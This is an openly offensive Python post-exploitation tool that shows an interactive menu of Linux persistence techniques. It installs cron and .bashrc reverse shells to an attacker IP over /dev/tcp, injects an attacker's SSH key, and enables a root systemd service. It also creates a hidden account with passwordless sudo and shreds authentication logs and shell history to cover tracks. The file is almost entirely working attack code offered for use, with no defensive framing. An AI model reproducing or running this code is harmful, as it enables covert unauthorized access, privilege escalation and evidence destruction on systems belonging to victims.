#!/usr/bin/env python3
import os
import subprocess
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box

console = Console()

def show_menu():
    """Interactive menu for persistence techniques"""
    console.print(Panel("[bold cyan]Persistence Techniques[/bold cyan]", box=box.SQUARE))
    options = [
        ("1", "Cron Job Reverse Shell (Root Optional)"),
        ("2", "SSH Key Injection (Requires Write Access)"),
        ("3", "Systemd Service (Requires Root!)"),
        ("4", "Create Privileged Local Account (Requires Root!)"),
        ("5", ".bashrc Backdoor (User-Level)"),
        ("6", "Clean Logs (Requires Root!)"),
        ("0", "Exit")
    ]

    for num, desc in options:
        console.print(f"[cyan]{num}.[/cyan] {desc}")

    choice = Prompt.ask("\nSelect technique", choices=[str(i) for i in range(7)], default="0")
    return choice


def install_backdoor():
    """Main persistence handler with interactive menu"""
    while True:
        choice = show_menu()

        if choice == "1":
            ip = Prompt.ask("[?] Attacker IP for reverse shell")
            port = Prompt.ask("[?] Attacker Port")
            cron_backdoor(ip, port)

        elif choice == "2":
            key = Prompt.ask("[?] Paste attacker's SSH public key")
            ssh_persist(key)

        elif choice == "3":
            if os.getuid() != 0:
                console.print("[red][-] Requires root privileges![/red]")
                continue
            systemd_persist()

        elif choice == "4":
            if os.getuid() != 0:
                console.print("[red][-] Requires root privileges![/red]")
                continue
            username = Prompt.ask("[?] New username to create")
            password = Prompt.ask("[?] Password for new account")
            create_privileged_account(username, password)

        elif choice == "5":
            ip = Prompt.ask("[?] Attacker IP for reverse shell")
            port = Prompt.ask("[?] Attacker Port")
            bashrc_persist(ip, port)

        elif choice == "6":
            if os.getuid() != 0:
                console.print("[red][-] Requires root privileges![/red]")
                continue
            clean_logs()

        elif choice == "0":
            break

        else:
            console.print("[red][-] Invalid choice![/red]")


def cron_backdoor(ip, port):
    cron_cmd = f'*/10 * * * * root /bin/bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'
    cron_path = "/etc/cron.d/persist"

    try:
        with open(cron_path, "w") as f:
            f.write(cron_cmd)
        console.print(f"[green][+] Cron backdoor installed: {cron_path}[/green]")
    except PermissionError:
        console.print("[yellow][-] Failed (needs root). Trying user crontab...[/yellow]")
        subprocess.run(
            f'(crontab -l 2>/dev/null; echo \'*/10 * * * * bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"\') | crontab -',
            shell=True
        )
        console.print("[green][+] User crontab entry added![/green]")


def ssh_persist(public_key):
    ssh_dir = os.path.expanduser("~/.ssh/")
    auth_file = f"{ssh_dir}authorized_keys"

    if not os.path.exists(ssh_dir):
        os.makedirs(ssh_dir, mode=0o700)
        console.print(f"[green][+] Created {ssh_dir}[/green]")

    with open(auth_file, "a+") as f:
        f.write(f"\\n{public_key}\\n")

    os.chmod(auth_file, 0o600)
    console.print(f"[green][+] SSH key added to {auth_file}[/green]")
    console.print("[blue][+] Set permissions to 600[/blue]")


def systemd_persist():
    service = '''
[Unit]
Description=System Persistence Service

[Service]
ExecStart=/bin/bash -c 'while true; do sleep 60; done'
Restart=always
User=root

[Install]
WantedBy=multi-user.target
'''
    with open("/etc/systemd/system/persist.service", "w") as f:
        f.write(service)

    subprocess.run(["systemctl", "enable", "persist.service"], check=True)
    console.print("[green][+] Systemd service installed and enabled![/green]")


def create_privileged_account(username, password):
    try:
        subprocess.run(["useradd", "-m", "-s", "/bin/bash", username], check=True)
        subprocess.run(f"echo '{username}:{password}' | chpasswd", shell=True, check=True)

        with open("/etc/sudoers.d/persist", "w") as f:
            f.write(f"{username} ALL=(ALL:ALL) NOPASSWD:ALL\\n")

        console.print(f"[green][+] Created privileged account: {username}:{password}[/green]")
    except subprocess.CalledProcessError as e:
        console.print(f"[red][-] Failed: {e}[/red]")


def bashrc_persist(ip, port):
    bashrc_path = os.path.expanduser("~/.bashrc")
    payload = f'\\n# Persistence\\nbash -i >& /dev/tcp/{ip}/{port} 0>&1 &\\n'

    with open(bashrc_path, "a") as f:
        f.write(payload)

    console.print(f"[green][+] Reverse shell added to {bashrc_path}[/green]")
    console.print("[yellow][!] Trigger: User must log in via bash[/yellow]")


def clean_logs():
    targets = [
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/secure",
        "/var/log/cron",
        "~/.bash_history"
    ]

    console.print("[yellow][+] Cleaning logs...[/yellow]")
    for logfile in targets:
        expanded = os.path.expanduser(logfile)
        if os.path.exists(expanded):
            try:
                subprocess.run(["shred", "-u", expanded], check=True)
                console.print(f"[blue]    Wiped: {expanded}[/blue]")
            except:
                console.print(f"[red]    Failed to wipe: {expanded}[/red]")